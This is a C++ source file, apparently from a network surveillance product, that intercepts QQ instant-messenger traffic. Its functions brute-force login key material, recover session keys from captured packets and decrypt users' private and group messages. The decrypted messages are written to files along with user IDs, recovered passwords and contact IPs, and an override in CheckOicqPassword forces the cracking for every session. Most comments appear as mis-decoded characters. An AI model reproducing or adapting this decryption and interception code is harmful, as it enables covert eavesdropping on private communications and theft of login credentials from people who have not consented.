		for (int m2=0; m2<=255; m2++)
		{	
			for (int m3=0; m3<=255; m3++)
			{
				RESULT[0]=m3;
				RESULT[1]=m2;
				RESULT[2] = BA_checkkey[0];
				RESULT[3]=0;//m1;
				
			//	memcpy(g_RESULT,RESULT,4);
				
				for (int i=1; i<16; i++)
				{
					Change((DWORD*)RESULT);
					if(RESULT[2] != BA_checkkey[i])
						break;
				}
				
				if(i==16)
				{		
					// 					CString tmp;
					// 					tmp.Format("%02X%02X%02X%02X---------%02X%02X%02X%02X\n",
					// 						g_RESULT[0],g_RESULT[1],g_RESULT[2],g_RESULT[3],
					// 							RESULT[0],RESULT[1],RESULT[2],RESULT[3]);
					// 					OutputDebugString(tmp);
					
					//��֤ ba��ʼ ����5��rand
					for (int t=0;t<5;t++)
					{
						Change((DWORD*)RESULT);
					}
					
					BYTE  keybuf[16];
					for (int k=0;k<0x10;k++) //dd���� �� 0x78 �е� tmpkey ,������dd
					{
						Change((DWORD*)RESULT);	
						keybuf[k]=RESULT[2];
					}
					if(checkqqpass(keybuf,(BYTE*)DD_Downbuf,DD_buflen))
					{
						memcpy(DD_tmpkey,keybuf,0x10);
						return TRUE;
					}
					
				}
			}
		}
	}
	return FALSE;
}


//��ס����ʱ,ba���������� ,�ٶ���,����ȫ�������
BOOL GetQQDDDownKey2(BYTE* DD_tmpkey,BYTE* DD_Downbuf,int DD_buflen)
{
	
	DWORD  RESULT=0;
	//��Ϊ���Է���ֻ��3���ֽھ��ܳ�������������
	for(DWORD i=0;i<=0x00ffffff;i++ )
	{
		RESULT=i;
		BYTE  keybuf[16];
		for (int k=0;k<0x10;k++) //dd���� �� 0x78 �е� tmpkey ,������dd
		{
			Change(&RESULT);	
			keybuf[k]=(RESULT>>16)&0x7FFF;
		}
		if(checkqqpass(keybuf,(BYTE*)DD_Downbuf,DD_buflen))
		{
			memcpy(DD_tmpkey,keybuf,0x10);
			return TRUE;
		}
		
	}
	
	return FALSE;
}




void BkLoginPacket(OicqSession *s)
{
	static unsigned long staticseqcatch = 1;
	if(staticseqcatch > 100)	// ����10���Ϳ�����, ����Ҫ�ܶ�
		return ;

	CreateDir("e:\\ddebak");
	FILE* fp = NULL;
	try
	{
		CString ocpfile;
		ocpfile.Format("e:\\ddebak\\qqlogin_%04d.raw", staticseqcatch++);
		fp = fopen(ocpfile, "w+b");
		if (fp == NULL)
		{
			ocpfile.Empty();
			return ;
		}

		if (s->m_loginList.size() > 0)
		{
			int imlen = 0;
			fwrite("\xD4\xC3\xB2\xA1\2\0\4\0\0\0\0\0\0\0\0\0\xFF\xFF\0\0\1\0\0\0", 1, 24, fp);

			// ��λ�ԭ�����еİ�
			OicqPacketListIt end, item;
			char onepacket[2000];
			int lenpacket = 0;
			item = s->m_loginList.begin();
			end = s->m_loginList.end();
			while(item != end)
			{
				if (item->m_pPacketData != NULL)
				{
					if(item->m_qqcmd == 0xba || item->m_qqcmd == 0xdd)
					{
						OutputOnePacket(item->m_packetheader,
							item->m_pPacketData, onepacket, lenpacket);
						fwrite(onepacket, 1, lenpacket, fp);
					}
				}
				item++;
			}

			item = s->m_loginList.begin();
			end = s->m_loginList.end();
			while(item != end)
			{
				if (item->m_pPacketData != NULL)
				{
					if(item->m_qqcmd == 0xe5)
					{
						OutputOnePacket(item->m_packetheader,
							item->m_pPacketData, onepacket, lenpacket);
						fwrite(onepacket, 1, lenpacket, fp);
					}
				}
				item++;
			}

			item = s->m_loginList.begin();
			end = s->m_loginList.end();
			while(item != end)
			{
				if (item->m_pPacketData != NULL)
				{
					if(item->m_qqcmd == 0x22 || item->m_qqcmd == 0x30)
					{
						OutputOnePacket(item->m_packetheader,
							item->m_pPacketData, onepacket, lenpacket);
						fwrite(onepacket, 1, lenpacket, fp);
					}
				}
				item++;
			}
			fclose(fp);
			fp = NULL;
		}
	}
	catch(...)
	{
		WriteLog(IMSGPRO, "BkLoginPacket() Error!!");
		if (fp!=NULL)
		{
			fclose(fp);
		}
	}
	return ;
}

//*************************************************
//	��������:		CheckOicqPassword
//	����:			���qq�������Ƿ���ȷ���õ�SessionKey
//	�������:		qqid qq����
//					
//	�������:		
//	����ֵ:			
//	����:			����m_siontype��״̬��־���жϽ��
//**************************************************
void OicqSession::CheckOicqPassword(DWORD qqid)
{
int error=0;
	try
	{
		ASSERT(CheckHaveGo());
		
		m_sontype |= BIT_CHKPASS;		// �����Ѽ��������־
		QQPWD* pwdlist = 0;
error=1;		
		//hzs  debug  using
		// #ifdef _DEBUG
		// 	QQPWD passlist;
		// 	if(qqid==76768280)
		// 	{
		// 		memcpy(passlist.pwd2md5,"\x10\xB4\x39\xF3\xE7\xA0\xF7\xF6\xCC\x89\x7D\x7D\x74\x45\xAE\xDF",16);
		// 		pwdlist=&passlist;
		// 	}
		//  #else
		int okswitch = 0;
		if(g_dbgSwitch.m_dbgtrystat)
		{
			g_qqTry[0] ++;
			okswitch = 0;
		}
		
		BOOL bNeed=FALSE;
		SearchOicqPwd(qqid, pwdlist);
		if(v_programtype== SYSTEM_SLEUTH)
		{
			bNeed=TRUE;
		}
		else if(m_sontype & (BIT_ISCASE))
		{
			bNeed=TRUE;
		}
		
error=2;
		//ȫ�ſ�, ������
		bNeed=TRUE;

		
		time_t captm=0;
		if (pwdlist!=NULL || bNeed)
		{
			// ��ԭSessionKey
			BYTE*   pTmpData = NULL;
			int		ptmplen = 0;
			while (pwdlist!=NULL || bNeed)
			{
				BYTE dekey[20];
				bytebuffer pbuf;
				token ttToken;
				unsigned char		VerifyKey2[LEN_TEA_KEY];
				unsigned char		InfoKey1[LEN_TEA_KEY];
				unsigned char		InfoKey2[LEN_TEA_KEY];
				memset(VerifyKey2,	0, LEN_TEA_KEY);
				memset(InfoKey1,	0, LEN_TEA_KEY);
				memset(InfoKey2,	0, LEN_TEA_KEY);
				BOOL bOK = FALSE;
				BOOL bOKPass = FALSE;
				
				if(pwdlist!=NULL)
				{
error=3;
					// ����һ������
					if(m_qqver < QQ2009P4)
					{
						// ������Session
						if(FALSE == FindPacket(0x30, &pTmpData, ptmplen, FALSE, -1))
						{
							if(FALSE == FindPacket(0x22, &pTmpData, ptmplen, FALSE, -1))
							{
								ASSERT(FALSE);
								return ;
							}
						}
						if(g_dbgSwitch.m_dbgtrystat)
						{
							okswitch = 1;
						}
						bOK = TRUE;
						bOKPass = TRUE;
						memcpy(dekey, pwdlist->pwd2md5, LEN_TEA_KEY);
					}
					else
					{
error=4;
						if(FindPacket(0xdd, &pTmpData, ptmplen, TRUE, -1))
						{
							// 0xdd C->S
							memcpy(dekey, pTmpData, 16);
							pTmpData+=16;
							ptmplen -=16;
error=5;
							if (DecryptQQPacket(pTmpData, ptmplen,
								dekey, (BYTE*)g_pMsgBuffer))
							{
								memcpy(pbuf.data, g_pMsgBuffer, ptmplen);
								pbuf.len = ptmplen;
								pbuf.pos = 0x50;	// 0x40 see myqq prot_login.c
								pbuf.size = ptmplen;
								if(pbuf.data[0x17] == 0x38 && pbuf.data[0x51] == 0x78)
								{
				error=51;
									get_token(&pbuf, &ttToken);
									ptmplen = ttToken.len;
				error=52;
									if(DecryptQQPacket(ttToken.data, ptmplen, 
										(BYTE*)pwdlist->pwd2md5, (BYTE*)g_pMsgBuffer))
									{
				error=53;
										memcpy(VerifyKey2, g_pMsgBuffer+ptmplen-16, 16);
										bOKPass = TRUE;
										bOK = TRUE;
									}
									else if(DecryptQQPacket(ttToken.data, ptmplen, 
										(BYTE*)pwdlist->pwdqqnomd5, (BYTE*)g_pMsgBuffer))
									{
				error=54;
										memcpy(VerifyKey2, g_pMsgBuffer+ptmplen-16, 16);
										bOKPass = TRUE;
										bOK = TRUE;
									}
								}
							}
						}
				error = 55;
						if(bOK)
						{
							bOK = FALSE;
							if(FindPacket(0xdd, &pTmpData, ptmplen, FALSE, -1))
							{
								// �õ� s->c 0xdd��
								if(g_dbgSwitch.m_dbgtrystat)
								{
									okswitch = 1;
								}
								bOK = TRUE;
							}
						}
					}	
				}
error=6;
				/////////////////////////////0xdd����/////////////////////////////////////////////
				if(FALSE == bOK && bNeed)	// �������0xdd���VerifiyKey2ʧ������Ҫ����
				{
					bOK = FALSE;
					if(FindPacket(0xba, &pTmpData, ptmplen, TRUE, -1))
					{
						unsigned char bakey[16];
						memcpy(bakey, pTmpData, 16);
						if(FindPacket(0xdd, &pTmpData, ptmplen, FALSE, 0))
						{
error=7;					// �õ� s->c 0xdd��
							if(GetQQDDDownKey(VerifyKey2, bakey, pTmpData, ptmplen))
							{
#ifdef _DEBUG
								printf("%d verifykey2, ptmplen %d\n", qqid, ptmplen);
#endif
								if(g_dbgSwitch.m_dbgtrystat)
								{
									okswitch = 2;
								}
								bOKPass = FALSE;
								bOK = TRUE;
							}

							if(!bOK) //��ס�����,5�����ƽ���.
							{
								if( g_dbgSwitch.m_dbgtryall || (v_programtype== SYSTEM_SLEUTH) || (m_sontype & (BIT_ISCASE)) )
								{
									time_t t1=time(0);
									if(GetQQDDDownKey2(VerifyKey2, pTmpData, ptmplen))
									{
#ifdef _DEBUG					
										int diff=time(0)-t1;
										printf("%d ��ס���� verifykey2 --��ʱ%d s, ptmplen %d\n", qqid,diff, ptmplen);
#endif
										if(g_dbgSwitch.m_dbgtrystat)
										{
											okswitch = 3;
										}
										bOKPass = FALSE;
										bOK = TRUE;
									}
								}
							}
						}
					}
				}

error=8;
				if(bOK)
				{
					bOK = FALSE;
					if (DecryptQQPacket(pTmpData, ptmplen,
						VerifyKey2, (BYTE*)g_pMsgBuffer))
					{
error=9;
						bOK = TRUE;
						if(g_pMsgBuffer[2] == 1)	// CheckIsFirst0xdd
						{
							bOK = FALSE;
							memcpy(dekey, g_pMsgBuffer+3, 16);
							if(FindPacket(0xdd, &pTmpData, ptmplen, FALSE, 1))
							{
								bOK = FALSE;
								if (DecryptQQPacket(pTmpData, ptmplen,
									dekey, (BYTE*)g_pMsgBuffer))
								{
									bOK = TRUE;
								}
							}
						}
						if(bOK)
						{
							memcpy(pbuf.data, g_pMsgBuffer, ptmplen);
							pbuf.len = ptmplen;
							pbuf.pos = 3;
							pbuf.size = ptmplen;
 							get_token(&pbuf, &ttToken);
							if(ttToken.len > 0 && ttToken.len < ptmplen-20)
							{
								pbuf.pos = ptmplen-18;		// ֱ��ƫ������ĩλ�õ�key
								if(16 == get_data(&pbuf, InfoKey1, 16))
									bOK = TRUE;
							}
// 							pbuf.pos += 8;	// two get_int
// 							get_token(&pbuf, &ttToken);
// 							get_token(&pbuf, &ttToken);
// 							if(m_qqver < 0x1645)
// 							{
// 								if(16 == get_data(&pbuf, InfoKey1, 16))
// 									bOK = TRUE;
// 							}
// 							else
// 							{
// 								pbuf.pos += 18;	// two get_int
// 								if(16 == get_data(&pbuf, InfoKey1, 16))
// 									bOK = TRUE;
// 							}
						}
					}
				}
				
error=10;				
				////////////////////////////////////��0xe5//////////////////////////////////////
				if(bOK)
				{
					bOK = FALSE;
					if(FindPacket(0xe5, &pTmpData, ptmplen, FALSE, 0))
					{
						// 0xe5 S->C
						if (DecryptQQPacket(pTmpData, ptmplen,
							InfoKey1, (BYTE*)g_pMsgBuffer))
						{
							memcpy(pbuf.data, g_pMsgBuffer, ptmplen);
							pbuf.len = ptmplen;
							pbuf.pos = 4;	// 0x40 see myqq prot_login.c
							pbuf.size = ptmplen;
							if(16 == get_data(&pbuf, InfoKey2, 16))
							{
								memcpy(m_de0x30key, InfoKey2, 16);
								bOK = TRUE;
							}
						}
					}
				}
error=11;
				if(bOK)
				{
					bOK = FALSE;
					if(FindPacket(0x30, &pTmpData, ptmplen, FALSE, 0))
					{
						// 0x30 S->C
						memcpy(dekey, InfoKey2, 16);
						bOK = TRUE;
					}
				}
				else if(BIT_OKSESSION == (m_sontype&BIT_OKSESSION))
				{
					bOK = FALSE;
					if(FindPacket(0x30, &pTmpData, ptmplen, FALSE, 0))
					{
						// 0x30 S->C
						memcpy(dekey, m_de0x30key, 16);
						bOK = TRUE;
					}
				}
				
				if(bOK && pTmpData != NULL)
				{
error=12;		
					if (DecryptQQPacket(pTmpData, ptmplen,
						dekey, (BYTE*)g_pMsgBuffer))
					{
error=13;
						if(pwdlist!=NULL && bOKPass)
						{
							if (strlen(pwdlist->longpwd)>0)
							{
								m_password = pwdlist->longpwd;
							}
	// 						else
	// 						{
	// 							m_password = pwdlist->password;
	// 						}
						}
error=14;
						if(ptmplen > 17)
						{
							switch(*g_pMsgBuffer)
							{
							case 0:		// ������֤ͨ��
error=15;
								memcpy(this->m_sessionkey, g_pMsgBuffer+1, LEN_TEA_KEY);
								m_sontype |= BIT_OKSESSION; // �Ѿ����SessionKey
error=16;
			#ifdef _DEBUG
								printf("%d Get SessionKey %s\n", qqid, CString((char*)m_sessionkey, 16));
			#endif
								if(g_dbgSwitch.m_dbgtrystat)
								{
									g_qqTry[okswitch] ++;
								}
								return;
							}
						}
						break;
					}
				}
error=20;
				if(pwdlist!=NULL)
					pwdlist = pwdlist->pNext;
				else
					bNeed = FALSE;
				
			} // while (pwdlist!=NULL)
			m_sontype &= (~(BIT_OKSESSION));// ȡ���ѻ��sessionkey��־
			m_password = "(������֤ʧ��)";
			if(g_dbgSwitch.m_dbgtrystat)
			{
				BkLoginPacket(this);
				if(m_sontype & BIT_S2C_0x30)
					okswitch = 4;
				else
					okswitch = 5;
				g_qqTry[okswitch] ++;
				WriteLog(IMSGPRO, "qqid %u ver 0x%02x, loginpacket size %d fails, okswitch %d(1pass,2ba,3crack,4/5fail)\r\n", 
					qqid, m_qqver, m_loginList.size(), okswitch);
			}				
			
		} // if (SearchOicqPwd(qqid, pwdlist))
	}
	catch (...)
	{
		WriteLog(IMSGPRO, "CheckOicqPassword() Error!!=%d;",error);
		BkLoginPacket(this);
	}
}

void OutputOnePacket(OLDDATEHEADER& packh, const BYTE* pdata, char* outbuf, int& outlen)
{
	outlen = 0;
	ASSERT(outbuf!=NULL);
	struct IPHeader
	{
		BYTE	ver;
		BYTE	tos;
		WORD	iplen;
		WORD	id;
		WORD	offset;
		BYTE	ttl;
		BYTE	pro;
		WORD	csum;
		DWORD	sip;
		DWORD	dip;
	}iph;
	struct TcpHeader
	{
		WORD	sport;
		WORD	dport;
		DWORD	seq;
		DWORD	ack;
		BYTE	offset;
		BYTE	flag;
		WORD	winsz;
		WORD	csum;
		WORD	uptr;
	}tcph;
	WORD	udph[4];
	long caph[4];
	caph[0] = packh.m_tm;
	caph[1] = packh.m_tm1;
	caph[2] = sizeof(iph)+14;
	// ether
	memcpy(outbuf+16, packh.m_mac, 12);
	memcpy(outbuf+12+16, "\x8\0", 2);
	// IP
	iph.ver = 0x45;
	iph.tos = 0;
	iph.id = (packh.m_ipid==0)? rand() : Swap2Byte(packh.m_ipid);
	iph.pro = (packh.m_type == 3)? 17 : 6;
	iph.ttl = 128;
	iph.offset = 0;
	iph.iplen = Swap2Byte((packh.m_type == 3)? packh.m_datalen+28 : packh.m_datalen+40);
	memcpy(&iph.sip, packh.m_sip, 4);
	memcpy(&iph.dip, packh.m_dip, 4);
	iph.csum = 0;
	memcpy(outbuf+14+16, &iph, sizeof(iph));
	if (packh.m_type == 3)
	{
		// UDP
		udph[0] = Swap2Byte(packh.m_sport&0xFFFF);
		udph[1] = Swap2Byte(packh.m_dport&0xFFFF);
		udph[2] = Swap2Byte(packh.m_datalen+8);
		udph[3] = 0;	// csum;
		memcpy(outbuf+caph[2]+16, udph, 8);
		caph[2] += 8;
	}
	else
	{
		ASSERT(packh.m_type==2);
		// tcp
		tcph.sport = Swap2Byte(packh.m_sport);
		tcph.dport = Swap2Byte(packh.m_dport);
		tcph.seq = Swap4Byte(packh.m_sequence);
		tcph.ack = Swap4Byte(packh.m_ack);
		tcph.offset = 0x50;
		tcph.flag = packh.m_control;
		tcph.winsz = 0x0045;
		tcph.uptr = 0;
		tcph.csum = 0;
		memcpy(outbuf+caph[2]+16, &tcph, sizeof(tcph));
		caph[2]+=sizeof(tcph);
	}
	// DATA
	memcpy(outbuf+caph[2]+16, pdata, packh.m_datalen);
	caph[2]+=packh.m_datalen;
	
	// WriteRawFile
	caph[3] = caph[2];
	memcpy(outbuf, caph, 16);
	outlen = caph[2]+16;
}

// ����ԭʼ��QQ����ʽΪTCPDUMP
int  OicqSession::SaveOcpFile(BOOL bOutput)
{
	
	FILE* pf = NULL;
	try
	{
		CString ocpfile;
		// 		ASSERT(m_LoginReq.m_pPacketData != NULL);
		// 		ASSERT(m_LoginRes.m_pPacketData != NULL);
		time_t newtm = m_lastpacktm;
		if (m_packetlist.size() > 0)
		{
			int imlen = 0;
			if (ocpfile.IsEmpty())
			{
				ocpfile = CreateFilename(m_sip, m_dip, "imsg_oicq.ocp");
				memcpy(g_pMsgBuffer,
					"\xD4\xC3\xB2\xA1\2\0\4\0\0\0\0\0\0\0\0\0\xFF\xFF\0\0\1\0\0\0", 24);
				g_Msglen = 24;
				// ���Ȼ�ԭ��½�İ�
				// 				if (m_LoginReq.m_pPacketData != NULL)
				// 				{
				// 					OutputOnePacket(m_LoginReq.m_packetheader,
				// 						m_LoginReq.m_pPacketData, g_pMsgBuffer + g_Msglen, imlen);
				// 					g_Msglen += imlen;
				// 				}
				// 				if (m_LoginRes.m_pPacketData != NULL)
				// 				{
				// 					OutputOnePacket(m_LoginRes.m_packetheader,
				// 						m_LoginRes.m_pPacketData, g_pMsgBuffer + g_Msglen, imlen);
				// 					g_Msglen += imlen;
				// 				}
			}
			else
			{
				g_Msglen = 0;
			}
			// ��λ�ԭ�����еİ�
			OicqPacketListIt end, item;
			item = this->m_packetlist.begin();
			end = this->m_packetlist.end();
#ifdef		_DEBUG
			OicqPacket	*qqpacket;
#endif
			while(item != end)
			{
#ifdef		_DEBUG
				qqpacket = &(*item);
#endif
				newtm = item->m_packetheader.m_tm;
				ASSERT(item->m_pPacketData != NULL);
				if (item->m_pPacketData != NULL)
				{
					//					currenttm = item->packetheader.tm;
					OutputOnePacket(item->m_packetheader,
						item->m_pPacketData, g_pMsgBuffer + g_Msglen, imlen);
					g_Msglen += imlen;
				}
				m_packetlist.erase(item++);
				if (g_Msglen > (MSGBUFFERLEN - 2000))
				{
					break;
				}
			}
			// д�ļ�
			if (g_Msglen > 24)
			{
				pf = fopen(ocpfile, "ab");
				if (pf == NULL)
				{
					ocpfile.Empty();
					return FALSE;
				}
				fwrite(g_pMsgBuffer, g_Msglen, 1, pf);
				fclose(pf);
				pf = NULL;
			}
		}
		
		if ((!ocpfile.IsEmpty()) && (bOutput))
		{
			// ���OCP�ļ�
			m_begfiletm = m_filetm;
			m_filetm = newtm;
			m_OpenIndxFlg = FALSE;		// ocp�ļ���д����
			m_OpenCaseFlg = v_opencaseoicq;
			m_OpenWarnFlg = v_openwarnoicq;
			// д�����ļ�
			m_realfname = ocpfile;
			ocpfile.Empty();
			m_indexfname = m_realfname + ".indexfile.txt";
			CString stetxt;
			stetxt.Format("user= %s\r\nentity= 2\r\nqqver= 0x%04x\r\n", m_userid, m_qqver);
			// 			if (!m_password.IsEmpty())
			// 			{
			// 				stetxt.Format("%spass= %s\r\n", (CString)stetxt, m_password);
			// 			}
			//			stetxt += "";
			WriteIndexFile("imsg_oicq", "imsg_oicq", stetxt, g_pImsgMissObj);
		}
	}
	catch(...)
	{
		WriteLog(IMSGPRO, "SaveOcpFile() Error!!");
		if (pf!=NULL)
		{
			fclose(pf);
		}
	}
	return 0;
}

int  OicqSession::ParseQQPacketList()
{
//	return 0;
int error=0;
	try
	{
		time_t newtm = m_lastpacktm;
		if (m_packetlist.size()>0)
		{
			OicqPacketListIt end, item;
			item = this->m_packetlist.begin();
			end = this->m_packetlist.end();
	#ifdef		_DEBUG
			OicqPacket	*qqpacket;
	#endif
			char* pMsgbuf = g_pMsgBuffer+2048;
			g_Msglen = 0;
			int imlen = 0;
			//		time_t currenttm = m_filetm;
			BOOL bIsPart;
			int  partLen = 0;
			unsigned short qqcmd = 0;
			BOOL bC2S ;
error=1;
			while(item != end)
			{
	#ifdef		_DEBUG
				qqpacket = &(*item);
	#endif
				newtm = item->m_packetheader.m_tm;
				bIsPart = FALSE;
				BYTE* pData = item->m_pPacketData + item->m_base;
				int len = item->m_packetheader.m_datalen-item->m_base-1;
				// baseȡֵ, 7 udp s->c, 11 udp c->s, 9 tcp s->c, 13 tcp c->s
				if(len%4)
				{
					/// ������ݲ���������, ��������.
					/// tcp�ж��������, �����������Ͷ�
					if(FALSE == item->m_bTCP)//m_base==7 || item->m_base==11)	
					{
						item++;
						//					m_packetlist.erase(item++);
						continue;	// UDP
					}
					else
					{
						pData = item->m_pPacketData;
						partLen = pData[0]*256+pData[1];
						if((partLen-item->m_base-1)%4)
						{
							item++;
							// 						m_packetlist.erase(item++);
							continue;
						}
						
						pData = pData+item->m_base;
						bC2S = item->m_bC2S;
						qqcmd = item->m_pPacketData[5]*256+item->m_pPacketData[6];
						bIsPart = TRUE;
					}
				}
error=2;				
				if(bIsPart)
				{
					int qqdatalen = item->m_packetheader.m_datalen;
					int partDataLen = partLen - item->m_base -1;
					int zDecodeLen;
					while(qqdatalen> 0 && qqdatalen >= partLen)
					{
						zDecodeLen = partDataLen;
						if(DecryptQQPacket(pData, zDecodeLen, m_sessionkey, (BYTE*)g_pMsgBuffer))
						{
							if(g_Msglen > 0)
								WriteLog(IMSGPRO, "111111 g_Msglen %d(ӦΪ0)", g_Msglen);
							imlen = 0;
							OutMessage(this, qqcmd, 
								(BYTE*)g_pMsgBuffer, zDecodeLen,
								pMsgbuf, imlen,
								bC2S, item->m_packetheader.m_tm);
							if(g_Msglen > 0)
								WriteLog(IMSGPRO, "2222222 g_Msglen %d(ӦΪ0)", g_Msglen);
							if (imlen>0)
							{
								OutData(pMsgbuf,imlen);//һ��дһ�ζ����ļ�
								if(g_Msglen > 0)
									WriteLog(IMSGPRO, "33333333 g_Msglen %d(ӦΪ0)", g_Msglen);
								
									/*							pMsgbuf+= imlen;
									g_Msglen += imlen;
									*pMsgbuf = 0;
									if (g_Msglen > MSGBUFFERLEN-5000)
									{
									qqdatalen -= partLen;
									//								if(qqdatalen == 0)
									//									m_packetlist.erase(item++);
									break;	// ��������, �ж�
							}*/
							}
						}
	#ifdef _DEBUG
						else
						{
							printf("DecryptQQPacket Fails a\n");
						}
	#endif
						
error=3;
						pData = pData+partDataLen+1;
						qqdatalen -= partLen;
						if(qqdatalen > 0)
						{
							partLen = pData[0]*256+pData[1]; // *(*(unsigned short)
							ASSERT(partLen <= qqdatalen);
							
							partDataLen = partLen-item->m_base-1;
							
							ASSERT(pData[2]==2 && pData[item->m_base+partDataLen]==3);
							qqcmd = pData[5]*256+pData[6];
							pData += item->m_base;
						}
					}
	#ifdef _DEBUG
					if(qqdatalen > 0)
					{
						printf("one part packet\r\n");
					}
	#endif
				}
				else
				{
error=4;
					if (DecryptQQPacket(pData, len, m_sessionkey, (BYTE*)g_pMsgBuffer))
					{
						if(g_Msglen > 0)
							WriteLog(IMSGPRO, "44444444 g_Msglen %d(ӦΪ0)", g_Msglen);
						imlen = 0;
						OutMessage(this, item->m_qqcmd, 
							(BYTE*)g_pMsgBuffer, len,
							pMsgbuf, imlen, 
							item->m_bC2S, item->m_packetheader.m_tm);
						if(g_Msglen > 0)
							WriteLog(IMSGPRO, "5555555555 g_Msglen %d(ӦΪ0)", g_Msglen);
						if (imlen>0)
						{
							OutData(pMsgbuf,imlen);//һ��дһ�ζ����ļ�
							if(g_Msglen > 0)
								WriteLog(IMSGPRO, "6666666666 g_Msglen %d(ӦΪ0)", g_Msglen);
							// 						pMsgbuf+= imlen;
							// 						g_Msglen += imlen;
							// 						*pMsgbuf = 0;
							// 						if (g_Msglen > MSGBUFFERLEN-5000)
							// 						{
							// 							m_packetlist.erase(item++);
							// 							break;	// ��������, ���Ѿ�����İ�, �ж�
							// 						}
						}
					}
	#ifdef _DEBUG
					else
					{
						printf("DecryptQQPacket Fails b\n");
					}
	#endif
				}
				item++;
				//			m_packetlist.erase(item++);
			}
error=5;
			if(item == end)
				m_packetlist.clear();
			else
			{
				printf("item != end");
				m_packetlist.erase(m_packetlist.begin(), item);
			}
			
		}
		
		// 	if (bOutput || (g_Msglen>0))
		// 	{
		// if(g_Msglen > 0)
		// 	WriteLog(IMSGPRO, "888888888 g_Msglen %d(ӦΪ0)", g_Msglen);
		// 		// дʵ���ļ�
		// 		memset(g_pMsgBuffer + 2048 + g_Msglen, 0, 4);
		// 		if (bOutput || (g_Msglen + m_MsgBufLen >= MSGBUFLEN))
		// 		{
		// 			// д�ļ�
		// 			WriteRealFile(g_pMsgBuffer + 2048, g_Msglen);
		// 		}
		// 		else
		// 		{
		// WriteLog(IMSGPRO, "���� g_MsgLen �� OICQ.cpp.ParseQQPacketList���� %d(ӦΪ0)", g_Msglen);
		// 			if (m_pMsgBuf == NULL)
		// 			{
		// 				m_pMsgBuf = new char[MSGBUFLEN];
		// 			}
		// 			memcpy(m_pMsgBuf + m_MsgBufLen, g_pMsgBuffer + 2048, g_Msglen+1);
		// 			m_MsgBufLen += g_Msglen;
		// 		}
		// 		g_Msglen = 0;
		// 	}
		// 	
		// 	if ((!m_filename.IsEmpty()) && (bOutput))
		// 	{
		// 		// ���txt�ļ�
		// 		m_begfiletm = m_filetm;
		// 		m_filetm = newtm;
		// 		m_OpenIndxFlg = v_openflagoicq;
		// 		m_OpenCaseFlg = v_opencaseoicq;
		// 		m_OpenWarnFlg = v_openwarnoicq;
		// 		
		// 		// д�����ļ�
		// 		m_realfname = m_filename;
		// 		m_filename.Empty();
		// 		m_indexfname = m_realfname + ".indexfile.txt";
		// 		
		// 		// ƥ�䰸��Ԥ����������Ϣ
		// 		DWORD dwState = 0;
		// 		m_CaseArr.RemoveAll();
		// 		m_WarnArr.RemoveAll();
		// 		SearchCaseOrWarn(this, m_userid, m_userid.GetLength(), dwState);
		// 		SearchCaseEmailIm(this, m_userid, m_userid.GetLength(), 0);
		// 		
		// 		CString stetxt;
		// 		stetxt.Format("user= %s\r\npass= %s\r\nentity= 1\r\nqqver= 0x%04x\r\n", m_userid, m_password, m_qqver);
		// 		WriteIndexFile("imsg_oicq", "imsg_oicq", stetxt, g_pImsgMissObj);
		// 	}
		return 0;
	}
	catch (...)
	{
		WriteLog(IMSGPRO, "ParseQQPacketList() Error!!=%d",error);
	}
	return 0;
}

void OicqSession::OutData(const char* pData, int datalen)
{
	WriteRealFile(pData, datalen);
	// ���txt�ļ�
	m_begfiletm = m_filetm;
	m_filetm = time(0);
	m_OpenIndxFlg = v_openflagoicq;
	m_OpenCaseFlg = v_opencaseoicq;
	m_OpenWarnFlg = v_openwarnoicq;
	
	// д�����ļ�
	m_realfname = m_filename;
	m_filename.Empty();
	m_indexfname = m_realfname + ".indexfile.txt";
	
	// ƥ�䰸��Ԥ����������Ϣ
	DWORD dwState = 0;
	m_CaseArr.RemoveAll();
	m_WarnArr.RemoveAll();
	SearchCaseOrWarn(this, m_userid, m_userid.GetLength(), dwState);
	SearchCaseEmailIm(this, m_userid, m_userid.GetLength(), 0);
	
	CString stetxt;
	if (m_qqgoupid.IsEmpty())
	{
		
		DWORD remoteqqno=0;
		if(m_userid==m_from)
		{
			remoteqqno=atol((char*)(LPCTSTR)m_to);
		}
		else 
		{
			remoteqqno=atol((char*)(LPCTSTR)m_from);
		}
		
		
		//ƥ����ϵ�˵�Զ��ip 
		CString remotestr;
		if(m_mapQQFriendIP.Lookup(remoteqqno, remotestr))
		{
			stetxt.Format("user= %s\r\npass= %s\r\nentity= 1\r\nsender= %s\r\ncontentid= %s\r\nremoteqqip=%s\r\nqqver= 0x%04x\r\n",
				m_userid, m_password,m_from,m_to,remotestr, m_qqver);
		}
		else 
		{
			stetxt.Format("user= %s\r\npass= %s\r\nentity= 1\r\nsender= %s\r\ncontentid= %s\r\nqqver= 0x%04x\r\n", 
				m_userid, m_password,m_from,m_to, m_qqver);
		}
	}
	else
	{
		stetxt.Format("user= %s\r\npass= %s\r\nentity= 1\r\nsender= %s\r\ncontentid= %s\r\nqqgroupid= %s\r\nqqver= 0x%04x\r\n", 
			m_userid, m_password,m_from,m_to,m_qqgoupid, m_qqver);
	}
	WriteIndexFile("imsg_oicq", "imsg_oicq", stetxt, g_pImsgMissObj);
	
}

void OicqSession::WriteRealFile(const char* pData, int datalen)
{
	if (datalen>0 || m_MsgBufLen>0)
	{
		if (m_filename.IsEmpty())
		{
			m_filename = CreateFilename(m_sip, m_dip, "imsg_oicq.txt");
			ASSERT(!m_filename.IsEmpty());
		}
		FILE* fp = fopen(m_filename, "ab");
		if (fp == NULL)
		{
			return;
		}
		if (m_MsgBufLen > 0)
		{
			fwrite(m_pMsgBuf, m_MsgBufLen, 1, fp);
			m_MsgBufLen = 0;
			delete[] m_pMsgBuf;
			m_pMsgBuf = NULL;
		}
		fwrite(pData, datalen, 1, fp);
		fclose(fp);
	}
}

void OicqSession::FormatOicqPacket(WORD QQVer, WORD QQCmd, time_t packtm)
{
//	return ;
	if(m_userid.IsEmpty())
		return ;
	
	LPCTSTR CmdStr;
	switch((BYTE)QQCmd)	// QQ�����
	{
	case 0x27:		// ��ú����б�
		CmdStr = pQQCmd[QQ_GETLIST];
		if ((v_programtype != SYSTEM_SLEUTH) 
			&& (0 == (m_sontype & BIT_ISCASE)))
		{
			// ���ǰ����Ҳ���Sleuth�ͷ���
			//return;
		}
		break;
	case 0x01:		// ����
	case 0xa1:		// TCP����
		if(QQVer < TM2008)		
			CmdStr = pQQCmd[QQ_LOGOUT];
		else
		{
			// �߰汾��0x1�Ѿ�����������
			return;
		}
		break;
	case 0x62:
		if(QQVer > TM2008 && QQCmd == 0x0062)	
			CmdStr = pQQCmd[QQ_LOGOUT]; 
		else
		{
			// �Ͱ汾��0x62Ϊ��֪ʲô����
			return;
		}
